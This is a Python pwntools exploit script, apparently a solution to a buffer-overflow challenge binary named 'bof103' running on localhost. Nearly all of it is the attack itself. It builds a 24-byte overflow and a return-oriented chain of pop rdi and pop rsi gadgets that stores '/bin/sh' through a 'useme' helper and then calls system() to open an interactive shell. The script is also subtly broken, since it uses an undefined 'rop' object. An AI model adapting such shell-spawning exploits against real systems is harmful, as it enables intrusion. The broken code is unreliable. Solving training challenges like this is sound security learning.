import pwn

elf = pwn.ELF("./bof103")
p = elf.process()
pwn.context.log_level="DEBUG"
pr = pwn.remote("127.0.0.1", 5000)

system_addr = elf.symbols['system']
useme_addr = elf.symbols['useme']

pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address

print(pop_rdi)

payload = b"a"*24 # 16 bytes of char payload[16] + 8 bytes RBP
payload += pwn.p64(pop_rdi) #address of pop rdi;ret gadget
payload += b"/bin/sh\x00" # arg1 /bin/sh to put it into rdi
payload += pwn.p64(pop_rsi) # address of pop rsi;ret gadget
payload += pwn.p64(1) # arg2 =1 so /bin/sh * 1 = /bin/sh
payload += pwn.p64(useme_addr) #address of useme function to do multiplication of arg1*arg2 and put /bin/sh to to global variable key
payload += pwn.p64(pop_rdi) #address of pop rdi;ret gadget
payload += pwn.p64(0x601058) # address of global variable key
payload += pwn.p64(system_addr) #address of functions system

pr.recvuntil(b"Name > ")
pr.sendline(payload+ b"\n")

pr.interactive()